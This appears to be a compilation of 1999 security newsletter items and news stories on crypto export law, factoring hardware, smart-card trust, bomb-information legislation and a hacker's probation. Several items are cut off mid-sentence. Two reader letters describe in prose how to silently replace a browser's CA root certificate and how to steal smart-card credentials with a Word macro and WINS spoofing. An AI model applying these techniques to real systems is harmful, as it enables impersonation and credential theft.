          The FTC has asked the court for the money already paid by customers to their telephone companies for the
     toll charges to be put aside for consumer restitution and for the company to be barred from violating the law
     through its deceptive messages. 
          A successful case against the perpetrators would come as vindication to Taylor. He contacted a litany of people
     from his phone company to members of Congress to local police to report the matter. Most rebuffed him because he
     didnt have enough follow-up information for them to pursue a case. 
          While he was furious about the e-mail, Taylor said his anger got worse because I couldnt get anywhere with
     anybody. The whole thing just completely rubbed me the wrong way.

      BONN, May 17 (Reuters) - German police are developing an Internet search engine that will home in on illegal 
      activity on the Web, including paedophile networks and neo-Nazi propaganda, and lead detectives to those who
      publish or even view such sites, an official said on Monday.

      ``It should make it easier for the police to pinpoint criminal content on the Internet, secure evidence and 
      identify the senders and addressees,'' Deputy Interior Minister Claus Henning Schapper told a conference on 
      Internet security in Bonn.

      This workshop, the second in an ongoing annual series, will bring
      together leading figures from academia, government, and industry to
      discuss state-of-the-art intrusion detection technologies, and
      paradigms and issues from the research and commercial perspectives.
      
      
      The RAID International Workshop series is intended to further progress
      in intrusion detection by promoting the exchange of ideas in a broad
      range of topics among researchers, system developers, and users and by
      encouraging links between these groups. RAID'98, held in
      Louvain-la-Neuve, Belgium, was the first in an anticipated annual
      series of international workshops that has brought together leading
      figures from academia, government, and industry to ponder the current
      state of intrusion detection technologies and paradigms from the
      research and commercial perspectives. More than 130 participants
      attended RAID'98, with nearly 50% from outside Europe, reflecting the
      international nature of the meeting.
      
      
      RAID'99 is being hosted by the Purdue University CERIAS, in West
      Lafayette, Indiana, USA. The program committee invites submission of
      both technical and general interest papers and panels from those

      3. The subject category (see topic list) most appropriate for the
         paper or panel
      
      
      Paper submissions must include an abstract that is a maximum of 600
      words in length on a separate page. This abstract may be accompanied by
      a lengthier paper, which should be no more than ten pages (12 point
      font). Although encouraged, it is not necessary to submit a full paper
      for consideration as a speaker or for inclusion in the proceedings;
      however, potential speakers providing full paper submissions will be
      given preference in cases of equal quality. The program committee will
      allocate each accepted presenter up to 30 minutes for the talk, based
      on the complexity and interest of the proposed topic and the wishes of
      the speaker. The presenter will be informed of the presentation slot
      length when notified of acceptance.
      
      
      Panel submissions must include a description that is a maximum of 300
      words. The description should include both an outline of the format of
      the panel and a short rationale for the panel. The program committee
      will allocate one to two-hour time slots to each panel, based on the
      proposed topic, the number of panelists, and the wishes of the panel
      chair. The panel chair will be informed of the slot length when
      notified of acceptance. Panels which include time for general
      discussion and questions/answers for the panelists and the attendees
      are preferred to those which do not.
      
      
      All proposals must be in English. Plan to give all panels and talks in
      English.

          The Internationalization of Cryptography
      
      
      
      
      One of the stranger justifications of U.S. export controls is that they
      prevent the spread of cryptographic expertise.  Years ago, the
      Administration argued that there were no cryptographic products available
      outside the U.S.  When several studies proved that there were hundreds of
      products designed, built, and marketed outside the U.S., the Administration
      changed its story.  These products were all no good, they argued.  Export
      controls prevent superior American products from getting into foreign
      hands, forcing them to use inferior non-U.S. products.
      
      
      Nonsense.
      
      
      Cryptography is an international science.  Most of the cryptographic
      conferences are held outside the U.S.  Most of the cryptography
      researchers are at universities outside the U.S., and most cryptographic
      papers presented at conferences are written outside the U.S.  There are
      more advanced degree programs in cryptography outside the U.S. than there
      are inside.  Researchers outside the U.S. tend to be better funded, and
      there is more interest in their work.  Some of the most important
      cryptographic research ideas in the past ten years have come from outside
      the U.S.  The U.S. not only does not have a lock on cryptographic research,
      it does not even have the majority.
      
      
      In 1997, NIST solicited algorithms for the Advanced Encryption Standard, to
      replace DES as a government encryption standard.  Of the fifteen
      submissions received, ten were from companies and universities outside the
      U.S: Australia, Belgium, Canada, Costa Rica, England, France, Germany,
      Israel, Japan, Korea.  Of the five submissions likely to be chosen for the
      next round, about half will be from outside the U.S.  It is very possible
      that the next U.S. government encryption standard will have been designed
      outside the U.S.
      
      
      The Internet Engineering Task Force has created a series of cryptographic
      standards for the Internet: secure e-mail, encrypted and authenticated IP
      packets, secure socket-level communications, key exchange and certificate
      formats, etc.  These meetings are held several times a year, mostly in the
      U.S. but also outside.  Attendees are from companies all over the world,
      and the standards are written by international consensus.  The U.S. has no
      lock on the content of the standards, nor the evaluation process.  These
      standards are implemented in products built all over the world, not just in
      the U.S.  For example, a Finnish company called SSH has one of the best
      IPSec -- a standard for IP security -- implementations in the world.
      
      
      Other non-U.S. technology has been integrated into U.S. companies.  A
      Swedish company called COST built a comprehensive cryptographic toolkit.
      The company was acquired by Entegrity Solutions, Inc., a U.S. startup.
      Algorithmic Research, and its cryptographic products, was acquired by
      Cylink Corp.  ELVIS+, a Russian company, is now part of the U.S. company
      TrustWorks, Inc.  RSA Data Security, now owned by Security Dynamics Inc.,
      recently purchased the rights to a cryptographic product created in
      Australia.  This list goes on and on.  Again and again, U.S. companies have
      realized that cryptographic expertise is available outside the U.S., and
      have taken steps to secure that expertise.
      
      
      Cryptography does not stop at national borders.  Research, standards, and
      products are international.  Expertise is international.  For the U.S.
      Administration to believe that there are "national secrets" about
      cryptography that export controls somehow keep inside the U.S. is sheer
      folly.  There is no evidence that this is true, and considerable evidence
      that the reverse is true.

        Federal Appeals Court Agrees that Encryption 
             Export Rules are Unconstitutional
      
      
      
      
      The story so far: Dan Bernstein wanted to publish the details and source
      code to Snuffle, an algorithm of his.  Export rules prevented him from
      doing so.  He took this to court.  About a year and a half ago, Judge Patel
      agreed with him and ruled the export rules unconstitutional.  The
      government requested a stay, which was granted.  The case was appealed to
      the Federal Ninth Circuit Court of Appeals...
      
      
      ...which just agreed with Judge Patel's decision.
      
      
      Briefly, the Court agreed that source code can be (though isn't always)
      "expressive," and thus qualifies as speech for the purpose of the First
      Amendment.  Thus, the Export Administration Regulations (EAR) is a prior
      restraint on free speech.  While such things can be legal, they bear a
      heavy burden; EAR does not meet that burden, because (among other things)
      it grants unbridled discretion to the government, it provides no firm time
      limits for the process, and it bars judicial review.
      
      
      Despite the fact that their reasoning was narrowly focused on expressive
      source code, they struck down the entire rule on crypto export because the
      rule doesn't distinguish between expressive source, functional source, and
      object code, and they can't (and shouldn't) do a line-by-line rewrite of
      the EAR.  They also said that government efforts to control cryptography,
      in addition to being a First Amendment issue, may also be in conflict with
      the Fourth Amendment, the right to speak anonymously, the right against
      compelled speach, and the right to informational privacy.
      
      
      This does not mean that it is suddenly legal to export cryptography out of
      the U.S.  Judge Patel issued declaratory and injunctive relief, but it was
      almost immediately stayed.  The Ninth Circuit Court of Appeals affirmed her
      decision, but that Court's mandate does not issue until the time for
      petitioning for rehearing runs (14 days).  This will almost undoubtedly be
      stayed, as the government asks the Supreme Court to hear the case.  The
      conservative among us will wait before exporting source code.

         The Doghouse -- Novell NetWare's Remote Passwords
      
      
      
      
      Novell NetWare 5 (and 4.11 and 4.2) has a feature that allows
      administrators to remotely manage Novell servers.  These administrative
      accounts are protected by passwords, and the password are encrypted on the
      servers.  Unfortunately, the encryption algorithm doesn't work.
      
      
      According to a hacker named TheRuiner, the password file is only protected
      with some obfuscation, bit realignment, subtraction, value substitution,
      and an XOR cipher.  It's pretty trivial to break, and all it really took
      was for someone to reverse-engineer the code and see exactly how it worked.
      
      
      This isn't rocket science, guys.  Password protection is a solved problem:
      use a strong hash function.  I'm not sure why Novell wasn't paying attention.

             U.S. Crypto Legislation Update
      
      
      
      
      Once again, the U.S. Congress is trying to enact legislation to relax
      export controls on computer hardware and software that include encryption.
      The hope is that actual laws will eventually replace the ITAR regulations,
      which are not laws and have never been voted on.
      
      
      On March 24, the House Judiciary Committee approved H.R. 850, the "Security
      And Freedom through Encryption" (SAFE) Act.  We like this bill; it
      generally relaxes export controls on encryption software.  On the minus
      side, it also includes a controversial provision that creates a new
      criminal offense for using encryption during a crime.  But on the plus
      side, the Committee rejected an attempt by Rep. Bill McCollum (R-FL) to
      introduce an amendment that would have limited relaxation to those
      encryption products that have key-escrow (or whatever they are calling it
      these days).
      
      
      The bill is sponsored by Congressman Robert Goodlatte (R-VA) and
      Congresswoman Zoe Lofgren (D-CA) (both great people who deserve our
      support) and currently has 251 co-sponsors, including the Republican and
      Democrat leaders.  Republican leaders sent a "Dear Colleague" letter to all
      members of Congress last week urging passage of the bill.  Unfortunately,
      it has now been referred to the Commerce, International Relations, Armed
      Services, and Intelligence Committees for further review.  If you remember
      back to 1997, the House Armed Services and Intelligence Committees both
      revised a similar bill -- at the request of the FBI -- to impose
      restrictions on crypto products; their efforts to pass that gutted bill
      were defeated with help from industry and public interest groups.  Majority
      Leader Dick Armey has told Rep. Goodlatte that he expects the legislation
      to be voted on by the House by summer; we'll have to wait and see.
      
      
      There is also some progress in the Senate this year.  In a surprising
      turnaround, Senator John McCain (R-AZ) has reversed his previous support
      for domestic encryption restrictions and introduced a bill to slightly
      relax export controls.  His new bill, S. 798, "Promote Reliable On-Line
      Transactions to Encourage Commerce and Trade" (PROTECT) Act of 1999 relaxes
      export controls on products with 64-bit keys or less.  Restrictions are
      also relaxed on publicly traded companies, regulated or regularly audited
      companies (such as banks or insurance companies), subsidiaries of U.S.
      companies and strategic partners, online merchants, and governments in
      NATO, OECD and ASEAN (a weird choice).
      
      
      Products that have longer keys than 64 bits can be exported if a new
      Encryption Export Advisory Board and the Secretary of Commerce approve the
      exports after finding that "the product or service is...generally
      available, publicly available; or an encryption product utilizing the same
      or greater key length or otherwise providing comparable security is, or
      will be within the next 12 months generally or widely available outside the
      United States from a foreign supplier."  Decisions will be subject to
      judicial review.
      
      
      The bill requires the National Institute of Standards and Technology to
      finish the Advanced Encryption Standard (AES) selection by January 1, 2002.
      After the AES is selected, products that incorporate the AES or have an
      equivalent strength may be exportable without a license in most cases.  
      
      
      The bill also prohibits mandatory access to encryption keys or key recovery
      information by the United States government or the government of any state.
      However, it also contains provisions that require NIST to assist law
      enforcement in enhancing access to cryptography and intrusion detection
      systems.
      
      
      The bill has been referred to the Senate Commerce Committee, where Senator
      McCain is Chairman.  It is also co-sponsored by Senators Leahy (D-VT),
      Burns (R-MT), Kerry (D-MA), Abraham (R-MI), and Wyden (D-OR).
      
      
      It promises to be an interesting year in Congress.

                 Factoring with TWINKLE
      
      
      
      
      At Eurocrypt '99, Adi Shamir presented a new machine that could increase
      our factoring speed by about 100-1000 times.  Called TWINKLE (The Weizmann
      INstitute Key Locating Engine), this device brings 512-bit keys within the
      realm of our ability to factor.
      
      
      The best factoring algorithms known to date all work on similar principles.
      First, there is a massive parallel search for equations with a certain
      relation.  This is known as the sieving step.  Then, after a certain number
      of relations are found, there is a massive matrix operation to solve a
      linear equation and produce the prime factors.  The first step can easily
      be paralleled -- recently, 200 computers worked in parallel for about four
      weeks to find relations to help factor RSA-140 -- but the second has to be
      done on a single supercomputer: it took a large Cray about 100 hours and
      810 Mbytes of memory to factor RSA-140.
      
      
      Shamir conceptualized a special hardware device that uses electro-optical
      techniques to sieve at speeds much faster than normal computers.  He
      encodes various LEDs with values corresponding to prime numbers, and then
      uses it to factor numbers.  The machine reminds me of the famous Difference
      Engine of the 1800s.  Once the engineering kinks are worked out -- and
      there are considerable ones -- this machine will be as powerful as 100-1000
      PCs for about $5000.  The basic idea is not new; a mechanical-optical
      machine built by D.H. Lehmer in the 1930s did much the same thing (although
      quite a bit more slowly).
      
      
      As far as we know, Shamir's machine is never been built.  (I can't speak
      for secret organizations.)  As I said, Shamir presented a conceptualization
      and a sketch of a design, not a full set of engineering blueprints.  There
      are all sorts of details still to be figured out, but none of them seem
      impossible.  If I were running a multi-billion-dollar intelligence
      organization, I would turn my boffins loose at the problem.
      
      
      The important thing to note is that this new machine does not affect the
      matrix step at all.  And this step explodes in complexity for large
      factoring problems; its complexity grows much faster than the complexity of
      the sieving step.  And it's not just the time, it's the memory
      requirements.  With a 1024-bit number, for example, the matrix step
      requires something like ten terabytes of memory: not off-line storage, but
      real computer memory.  No one has a clue how to solve that kind of problem.
      
      
      This technique works just as well for discrete-logarithm public-key
      algorithms (Diffie-Hellman, ElGamal, DSA, etc.) as it does for RSA,
      although it is worth noting that the matrix problem is harder for
      discrete-log problems than it is for factoring.  The technique does not
      apply to elliptic-curve-based algorithms, as we don't know how to use the
      sieving-based algorithms to solve elliptic-curve problems.
      
      
      In "Applied Cryptography," I talked about advances in factoring coming from
      four different directions.  One, faster computers.  Two, better networking.
      Three, optimizations and tweaks of existing factoring algorithms.  And
      four, fundamental advances in the science of factoring.  TWINKLE falls in
      categories one and three; there is no new mathematics in this machine, it's
      just a much faster way of doing existing mathematics.
      
      
      Shamir's contribution is obvious once you understand it (the hallmark of a
      brilliant contribution, in my opinion), and definitely changes the
      landscape of what public-key key sizes are considered secure.  The moral is
      that it is prudent to be conservative -- all well-designed security
      products went beyond 512-bit moduli years ago -- and that advances in
      cryptography can come from the strangest places.

      >and trick me into trusting someone?  Of course it can.
      
      
      You don't even need rogue software, all you need is Internet Explorer.  Try
      this: Using your favorite certificate toolkit, create a CA root certificate
      which is identical to an existing one (except for the key) and stick it in
      a web page.  Click on the link with MSIE.  You'll be presented with a
      dialog telling you you're about to accept a new certificate from, for example,
      "Verisign Class 1 Public Primary Certification Authority".  Once you've
      clicked OK (as virtually all users will), you've replaced the standard CA
      root with your own one, and can use it to certify rogue servers, CA's,
      email, viruses, and whatever else you feel like.  There's no warning
      presented by MSIE, it just quietly replaces the existing cert.
      
      
      (Hint: You may want to test this with one of the lesser-used CA's rather
      than Verisign, because even ignoring the security implications it's a
      significant denial-of-service attack.  This hole may have been fixed in
      newer versions of MSIE, but it worked fine in 3.02, which is the last
      version which doesn't try to take over your machine when you install it).

      I enjoyed reading your paper on smart-card security issues (Cryptogram
      Apr/15/1999).  I find it specially useful since it provides yet more
      examples where trust cannot be seen as an objective property of a system,
      not even for some of its parts.  I believe the same applies to all systems,
      though -- however unperceived in most cases.  Smart-cards are thus IMO no
      better and no worse in principle than a computer on the Net.  Trust is
      essentially subjective and thus any recognizable part of any system can
      operate within its own and different trust truth-conditions -- potentially
      leading to different trust-values when in interaction with other parts,
      perhaps from other systems and also differently for each other part,
      history, and time.  At the end, the main question is thus not whether it is
      a smart-card or a computer on your desk -- but whether you can rely upon it
      for your decisions (i.e., trust it within a specific extent and epoch, for
      specific trust-points).  Which may be easier to accept for a smart-card
      that you always carry with you in contrast to a computer that you never
      see, such as a server -- but not necessarily, as your paper exemplifies.
      
      
      I would like to comment also on another part of your newsletter, where you
      have the title "Trusting the Known" -- since, of course, no one can trust
      the unknown.  IMO, the gist of your text is "Trusting with Qualification"
      which introduces the discussion on the *degree* of such qualification as
      you then proceed to do.  I also note that it is possible to trust without
      qualification on the trusted matter itself, even though you must know it --
      and that such may even apply to what you analyzed, as when a spy in a
      spy-ring trusts the key handed down by the spymaster, in an objective way
      as an "authorization" and entirely based on his trust on the spymaster...
      not on the key's qualifications.

      Careful how you phrase that.  As written, it could easily be used to
      justify choosing Microsoft PPP rather than IPSec because that is where "the
      crowd" has lead.
      
      
      Nobody who reads and understands the article would consider the masses
      generally unknowledgeable about cryptography to be the right "crowd" to
      follow of course, but I shudder to think of this article being read by a
      marketing droid looking for the catch-phrases for his next ad campaign, or
      a purchasing agent being challenged about an all-Microsoft buying policy.

      For the record, Netscape does not sign web sites' public keys (i.e., act as

      performed this service.  Thus there is no "root Netscape certificate"
      included in the Netscape Navigator and Netscape Communicator products, if
      by that you mean a certificate for a hypothesized Netscape CA.  Netscape
      Navigator and Netscape Communicator as shipped do include root CA
      certificates for a number of public CA services, and we recommend that our
      customers use those services (unless they wish to act as their own CA).
      
      
      This doesn't of course change the underlying argument of your article,

      Subject: Smart-Card Flaws
      
      
      For the last 2.5 years I've been responsible for the security issues when
      implementing a large Smart Card based authorization concept for Windows NT
      4.0 here in Sweden and here are 3 major flaws I've encountered when dealing
      with smart cards:
      
      
      1) When connecting to a NT server your user name, password and X509v3
      certificate are sent to the server.  The server starts a challenge response
      using the public key in the certificate and encrypts a random value.  The
      encrypted random value and the server certificate are then sent to the
      smart card and decrypted with the corresponding private key.  Then the
      smart card encrypts the random value with the server's public key in the
      server certificate and sends it back to the server, which compares the two
      values.  Since there is no connection between the value in the X509
      certificate (subject field and Common Name) and the user ID you may enter
      some other person's ID and password which are sent with your certificate.
      So the strong authentication will begin using your Public and private RSA
      keys but you will get the other person's privileges and access rights!
      
      
      2) On an RSA based smart card you usually store the user id and password on
      the data area (SSO table = Single Sign On Table) -- the problem lies in the
      fact that the smart cards offered today are limited in storage data, such
      as certificates and user IDs and passwords, to 8K maximum.  (You may find
      cards on the market that can store more than 8K data but you can't buy them
      yet.)  So if we use certificates with RSA based keys stored in them, which
      are 1024 bits long, you may only have 2 certificates and 2 corresponding
      private keys.  If we use RSA based keys stored in a smart card that are 512
      bits long, we can store 3 certificates in them.  And since 512 bit RSA keys
      are in the Wassenaar agreement and you may export them, you can't trust
      them :-).  So we used 1024 bits keys instead and used them for
      authentication and encryption.  So the following will then happen.  You
      enter the PIN that opens the card AND opens for usage of the certificate
      and private key for authentication/encryption since we want to do a strong
      authentication of the user.  I can then decrypt anything that the user of
      the smart card has encrypted since the usage of the private key is opened
      by the user when he enters his PIN!  If I can get the user to execute a
      Trojan horse program the user will not even know that I'm decrypting
      something he encrypted with his private key!  Therefore you can't encrypt
      the user id and the password stored on the smart card!  So I can read this
      from the smart card and get user id and the corresponding password and
      email it to me! (I've done this once using just Visual Basic for
      Application and a macro stored in the normal.dot)
      
      
      3) If we do a challenge response in a NT environment the server needs to
      know which work station/server he is talking to.  So in your case the
      server program used WINS to get the IP-address from the workstation name.
      This opened to a nice attack:
      
      
      The user logged in on a NT workstation using his smart card and was
      authenticated by challenge response.  We sent a email to the user that
      included a macro in the normal.dot and got the workstation's name from the
      workstation, and user id and password from the smart card.  We then got
      another NT workstation and named it as the user's workstation name and
      tried to get a  connection to a disk on the NT server.  We were prompted
      for user ID and password, which we entered and voila!  We got access to the
      disk!  The server in this case got the workstation name, the user id and
      password and used WINS to find the corresponding IP address for that
      workstation name.  Then the server did a strong authentication on the IP
      address that the server got from WINS.  That IP address was not our
      machine's IP address, it was the user's IP address!  In the NT security log
      we could read that the user logged in to that disk and that he was
      authenticated by the use of strong authentication.
      
      
      So the question is: Can you rely on Smart Cards?  And my answer is: Yes, if
      you know what they can do and what they can't!

      Jesse Berst, Editorial Director

      Wednesday, May 12, 1999
      
      
      We're still in the primitive days of the Internet. So we still expect some
      security problems. And we assume they'll get better. Right? Wrong.
      
      
      The security problem is getting worse. Headlines tell me Internet security
      lapses are becoming more common. Even the White House isn't safe. Click for
      more. And Melissa showed us viruses are growing more wily. We're all at the
      mercy of corner-cutting software vendors, inexperienced e-tailers and smart-ass
      programmers.
      
      
      WHY YOU ARE MORE VULNERABLE
      
      
      There's no single culprit. Much of it has to do with changing times:
      
      
      As the Internet is more widely used, the potential for good and bad increases By
      expanding networks, companies create more opportunity for security breaches As
      competition gets more intense, vendors push products out the door faster As
      product complexity increases, bugs are more likely As ecommerce explodes,
      vendors are rushing to set up shop online
      
      
      WHERE YOU ARE MOST VULNERABLE
      
      
      Computer users are being impacted at work, at home, online:
      
      
      The number of software bugs tracked in the BugNet database grew nearly 20-fold
      in the past five years. The bug explosion costs employers millions of hours in
      lost productivity The insidious Melissa virus, which infected over 100,000
      computers in the U.S., was a nuisance; weeks later the destructive CIH virus
      crashed more than half a million computers in South Korea and Turkey
      E-businesses are unwittingly exposing private customer information, including
      names, addresses and credit card info; last month 100 sites with improperly
      installed shopping carts were identified
      
      
      HOW TO LIMIT YOUR VULNERABILITY
      
      
      You can't prevent bugs, viruses and inept e-tailers. But there are ways to
      protect yourself.
      
      
      Your computer. If events of recent months didn't persuade you to obtain
      anti-virus software for your PC, maybe this quick click to free, five-star
      anti-virus downloads will do the trick. Click for more. Bookmark the Help
      Channel's Bug section for the latest bug alerts, patches and workarounds for

      business over the Internet, two major security holes you need to plug are DNS

     Senate blasts bomb-making info on Net 
     By Courtney Macavinta
     Staff Writer, CNET News.com
     May 19, 1999, 1:00 p.m. PT 

     Distributing bomb-making information on the Net would be illegal in most cases under Senate legislation being
     debated in the wake of the killings at Columbine High School in Littleton, Colorado, and a rash of subsequent threats
     at campuses around the country.

     With a 85-13 vote, Sens. Dianne Feinstein (D-California) and Orrin Hatch (R-Utah) successfully tacked an amendment onto the
     Violent and Repeat Juvenile Offender Accountability and Rehabilitation Act yesterday. The provision prohibits teaching or
     demonstrating how to make explosives with the "intent" that the information will be used to commit a federal crime.

     The law would apply to any form of distribution--books, magazines, or videos, for example. However, like measures Feinstein has
     pushed in the past, the Net is once again the focal point. That's because the two teenagers, who witnesses say killed 13 people
     in Littleton, reportedly documented their weapon-making and massacre plans online.

     "The youngsters in Colorado who perpetrated the crime indicated they got the formula for the pipe bombs directly from the
     Internet," Feinstein stated on the Senate floor.

     The same bill, which is still being debated today, also would require that Net access providers offer customers filtering
     technologies and bans online gun or explosives sales that would violate existing laws.

     But First Amendment experts are alarmed by the bomb-making provision. They say it could apply to people who aren't inciting
     violence.

     "If a high school chemistry teacher posts online material for a course that he knows could be used to build a device, it's entirely
     possible that someone unknown to the teacher will use it to commit a federal crime of violence," said Barry Steinhardt, associate
     director of the American Civil Liberties Union. "That is problematic, because on the Net you can't know the intent of your
     audience."

     But Hatch says to be prosecuted, publishers would have to encourage violence along with the posting of bomb-making data. The
     Senator pointed to the Animal Liberation Front's Web site as an example of the type of material he wants to outlaw. The site has
     a pamphlet, Final Nail #2, which includes diagrams about how to build devices to set off fire alarm sprinklers or to damage stores
     that sell fur coats.

     "It is a detailed guide to terrorist activities," Hatch said on the Senate floor.

     "Why someone feels the need to put such harmful material on the Internet is beyond me; there certainly is no legitimate need for
     our kids to know how to make a bomb," he added. "[If a] person crosses the line to advocate the use of that knowledge for violent
     criminal purposes, or gives it out knowing it will be used for such purposes, then the law needs to cover that conduct."

     Although the Hatch-Feinstein amendment targets only those whose "intent" is to incite violence, free speech watchdogs today
     echoed concerns they have with a recent federal court decision in Oregon that held online speakers liable for inciting offline
     violence.

     In that case, U.S. District Judge Robert Jones issued a permanent injunction prohibiting a group of abortion foes from distributing
     "wanted" posters that list abortion providers' personal information and redistributing the data on sites such as the Nuremberg
     Files, which called for the "baby butchers" to be "brought to justice." The case is under appeal.

     "What remains to be resolved by the courts is 'how far is too far' in making information available that could be used in the
     commission of a crime," said David Sobel, general counsel at the Electronic Privacy Information Center.

     "I have concerns about how the [bomb-making] language might be applied," he added. "Provisions like this are subject to abuse in
     the hands of an overzealous prosecutor."

     Still other legal experts said the amendment likely would pass constitutional tests.

     "There are serious constitutional questions about regulating information about making bombs," said Lance Rose, author of
     NetLaw. "If this law is passed and it survives any constitutional challenges, there will be a fundamental proposition that you can
     regulate bomb information at least sometimes."

     But Rose added: "It's a slippery slope. Once you have a law like this in place, the question is, 'How far can they go?'"

     Despite the free speech debate, legal experts say lawmakers' campaigns to rid the Net of bomb-making information won't
     necessarily help to curb access to such information.

     "There is ample information available about this offline, including information from the Agricultural Department and U.S. military
     training manuals," the ACLU's Steinhardt said. "The Net is a global medium--a lot of information also comes from outside of the
     United States. This measure is totally futile."

      Victims Want Bomb Sites Off Web 
      Reuters 

      5:50 p.m.  19.May.99.PDT
      The brother of convicted Unabomber Theodore Kaczynski, a victim of one of his bombings, and the mother of a victim
      of the Oklahoma City bombing made a plea on Wednesday for Internet companies to purge or block Web sites
      that carry recipes for building bombs. 

      David Kaczynski, Unabomber victim Gary Wright, and Marsha Kight, whose daughter died in the Oklahoma City blast,
      appeared at a news conference to ask America Online, Microsoft, Walt Disney, and Yahoo to police the vast array of
      Web sites on a voluntary basis. 

      Access to violent sites, particularly by children, has come under sharp focus since the Littleton, Colorado high school
      shootings, where one of the teenage killers detailed the building of pipe bombs on the Web a year earlier. 

      David Kaczynski, who has made few public statements since he exposed his brother as the Unabomber, said that he
      saw a parallel between his and his wife's decision to turn his brother in to authorities and the issue that faces
      Internet companies. 

      "It was absolutely agonizing for us to make the decision to turn in my brother," said Kaczynski, a social worker in upstate
      New York. "I think it's much less agonizing for Internet companies, and they ought to do it." 

      Wright, a Salt Lake City software executive, was injured when he picked up a Unabomber bomb behind a computer 
      store where he worked in 1987. Kight's 23-year-old daughter was among the 168 people who died in the 1995 bombing of
      the Oklahoma City federal office building. 

      Writing letters to AOL, Microsoft, Disney - which is part owner of the Go Network -- and Yahoo, the victims and a New
      York-based group called the Centre for Community Interest want host companies to scan for and delete bomb-making
      instructions and to block access to such sites through search engines. 

      Industry spokesmen said that companies do what they can, but they questioned whether it is possible to scan the content
      of every Web site, particularly if a bomb recipe, for example, contains just chemical ingredients and no violent or
      hateful language. 

      Dennis Saffran, head of CCI, which also has defended pornography-shop restrictions and panhandling bans, said
      that the call would not violate the constitutional right to free speech because they are seeking the voluntary
      cooperation of private companies. 

      But, he added, limited government regulation might be needed if companies don't participate on a voluntary basis. 

      "We're giving every troubled kid out there the tools to become a Tim McVeigh or a Ted Kaczynski," he said.

      Dark Spyre May end up in Jail 

      
      contributed by erewhon 
      A year shy of completing his probation after being indicted on two counts of felony theft in January 1995,
      Dark Spyre (Ryan David Schwartz) may soon end up behind bars. For several weeks in 1993-94 Dark Spyre
      worked on breaking the codes of a long-distance phone company based in Mississippi. Part of his sentance for
      these crimes was probation. Now his probation may be revoked. The Assistant District Attorney claims that he
      violated his probation when he used a computer. Dark Spyre claims that the closest he has gotten to a
      computer is when he asked a schoolmate to type a paper for him. Allowing someone else to use a computer
      on Schwartz's behalf, is the same as if Schwartz had used it, the DA said.

      Former Hacker in a Probation Struggle 

      PATTI MUCK 
      c.1999 Houston Chronicle

               SUGAR LAND, Texas -- From the blackness of his bedroom, Dark
      Spyre would be awakened by a desk lamp clicking on. 

               Hooked to his computer, it would signal him - sometimes in the middle
      of the night - that a fellow hacker was ready to begin. 

               For several weeks in late 1993 and early 1994, Ryan David Schwartz,
      alias Dark Spyre, was a high school senior by day, a computer hacker by
      night. Breaking the security code of a long-distance phone company based in
      Mississippi, he was able to charge thousands of dollars worth of computer
      bulletin board calls to the company. 

               When Sugar Land police showed up at the Houston-area home he
      shared with his grandparents and mother in March 1994, Schwartz
      confessed to hacking. They took his computer, all of the components, even
      the desk lamp. 

               Indicted on two counts of felony theft a month after his graduation, he
      pleaded guilty in January 1995. He was sentenced to five years' deferred
      adjudication - a punishment that would expunge the conviction from his
      record if successfully completed - plus 450 hours of community service,
      court costs and nearly $5,000 restitution. 

               Now, just a year shy of completing his probation, Schwartz faces a
      motion to revoke the probation. Revocation could send him to prison and
      end his pursuit of a degree at Baylor University in Waco. 

               From Schwartz's perspective, the Fort Bend County District
      Attorney's Office set him up for failure from the start and has treated him
      more like a violent criminal than an intelligent young man who made a mistake
      and was willing to pay for it. 

               From the prosecutor's perspective, Schwartz has been thumbing his
      nose at the court and deserves to be punished. 

               Not only has he ignored probation conditions that included orders not
      to use a computer, but he has abused a string of second chances, Assistant
      District Attorney Mike Elliott said. 

               ``It's a shame in a lot of ways, because he's a bright kid,'' said Elliott,
      who, coincidentally, is the computer expert in his office. ``But he just can't
      leave it alone. He's got an addiction.'' 

               Schwartz denied violating his probation. He insisted that he has been
      walking the straight and narrow - working nearly full-time at a Service
      Merchandise store in Waco, attending classes at Baylor and frantically
      rushing back to Fort Bend County every Friday afternoon to meet with his
      probation officer. 

               Sugar Land, an affluent community just outside of Houston, is about
      150 miles from Waco. 

               He said he has not used a computer and that fellow students have
      typed papers for him, which, according to his understanding of the probation,
      was allowed. 

               Elliott said the ruling was clear: Schwartz is forbidden from using a
      computer, period. Allowing someone else to use a computer on Schwartz's
      behalf, and using Schwartz's password, is the same as if Schwartz had used
      it, Elliott said. 

               ``I'm just trying to get school done and get a degree and get a career
      going,'' said Schwartz, now 23. 

               Elliott contended that Schwartz doesn't merit pity. Not only did
      Schwartz ignore a warning from LDDS Metromedia Communications, the
      long-distance company, to stop hacking long before the criminal charges
      were filed, but he also violated his probation by accessing the Internet and
      using a computer, the prosecutor said. 

               ``It's a game to them,'' he said of computer hackers. ``They don't see
      the danger, the real harm in what they're doing. Many people are under the
      misconception that if you do a crime on the computer, it's not that bad, like
      murdering somebody. 

               ``But it is a crime - a felony crime. How many people's phone bills
      went up because of acts he and others did? Everybody pays for his kind of
      crime.'' 

               Schwartz's probation problems started early, when he contended that
      his severe asthma prevented him from the lawn-cutting and outdoor
      maintenance chores that are typical of community service. 

               He had enrolled at the University of Houston in August 1994 and
      attended classes there through May 1995. After his enrollment at Baylor in
      July 1995, the community-service hours became more difficult to complete. 

               In September 1997, the first motion to revoke Schwartz's probation
      was filed, alleging that he had failed to report to the probation department in
      February, May and June 1996 and that he had failed to perform community
      service. A probation department report said Schwartz hadn't done service
      for a year. 

               It also maintained that, even after being referred to light duty because
      of his asthma, Schwartz failed to report for community service in Waco. 

               He denied that, saying he had reported but wasn't given an assignment
      compatible with his health. 

               At one point, he was instructed to clean out a dark, cellarlike room at a
      Waco charitable organization, he said. It was, he said, infested with rats, an
      environment his asthma was unable to tolerate. 

               He kept the job for only one day. A promised assignment in a library
      never materialized. 

               ``I was willing to do the work,'' he said. 

               After a hearing in December 1997, state District Judge Bradley Smith
      did not revoke his probation but made several changes in its terms. 

               Schwartz was given an additional 600 hours of community service, to
      be completed by Jan. 1, 1999. And he was forbidden from operating a
      computer without written court permission. 

               Schwartz took off a semester and reported for work daily at the
      Precinct 4 justice-of-the-peace office to complete his community service. His
      mother, Linda Schwartz, a secretary, paid the restitution, and his
      grandparents, Greta and Izu Schwartz, 71 and 73 respectively, helped pay
      lawyer and bond fees. 

               Already, the family had stacked up about $50,000 in payments to bail
      bondsmen and lawyers. 

               The family thought that the ordeal was nearing an end and that
      Schwartz could finish college and get his degree in finance and management
      information systems. He wants to have a career in financial consulting or
      investments. 

               Schwartz applied for early termination of his probation after he
      completed his community service, but was turned down. 

               Although the court granted his request to return to Baylor, he was told
